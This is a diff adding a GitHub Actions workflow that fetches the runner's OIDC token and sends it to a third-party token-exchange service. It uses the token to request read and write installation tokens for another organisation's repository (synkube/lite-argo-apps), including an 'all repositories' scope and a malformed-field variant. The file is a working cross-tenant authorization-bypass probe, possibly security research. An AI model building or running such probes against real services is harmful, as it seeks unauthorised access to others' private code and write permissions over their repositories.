@@ -1,0 +1,25 @@
+name: oidc2
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: probe
+        run: |
+          set -uo pipefail
+          RESP=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
+          TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          call() {
+            OUT=$(curl -sS -m 30 -D /tmp/h -w '|HTTP=%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' -d "$1")
+            echo "CALL[$2] => $(printf '%s' "$OUT" | tr '\n' ' ' | head -c 500)"
+          }
+          call "{\"subject_token\":\"$TOK\",\"resource\":{\"type\":\"github_repository\",\"id\":\"maitpatni/oidc-probe-i307063\"},\"requested\":{\"github_permissions\":{\"contents\":\"read\"}},\"exchange_profile\":\"github_actions_to_installation\"}" "self-repo"
+          call "{\"subject_token\":\"$TOK\",\"resource\":{\"type\":\"github_repository\",\"id\":\"synkube/lite-argo-apps\"},\"requested\":{\"github_permissions\":{\"contents\":\"read\"},\"installation_repository_scope\":\"all\"},\"exchange_profile\":\"github_actions_to_installation\"}" "lite-argo-scope-all"
+          call "{\"subject_token\":\"$TOK\",\"resource\":{\"type\":\"github_repository\",\"id\":\"synkube/lite-argo-apps\"},\"requested\":{\"github_permissions\":{\"contents\":\"write\",\"metadata\":\"read\"}},\"exchange_profile\":\"github_actions_to_installation\"}" "lite-argo-write"
+          call "{\"subject_token\":\"$TOK\",\"resource\":{\"type\":\"github_repository\",\"id\":\"synkube/definitely-no-such-repo\"},\"requested\":{\"github_permissions\":{\"contents\":\"read\"}},\"exchange_profile\":\"github_actions_to_installation\"}" "nonexistent-repo"
+          call "{\"subject_token\":\"$TOK\",\"resource\":{\"type\":\"github_repository\",\"id\":\"maitpatni/oidc-probe-i307063\"},\"requested\":{\"github_permissions\":{\"contents\":\"read\"}},\"exchange_profile\":\"github_actions_to_installation\",\"audience\":\"x\"}" "self-repo-with-extra-field"
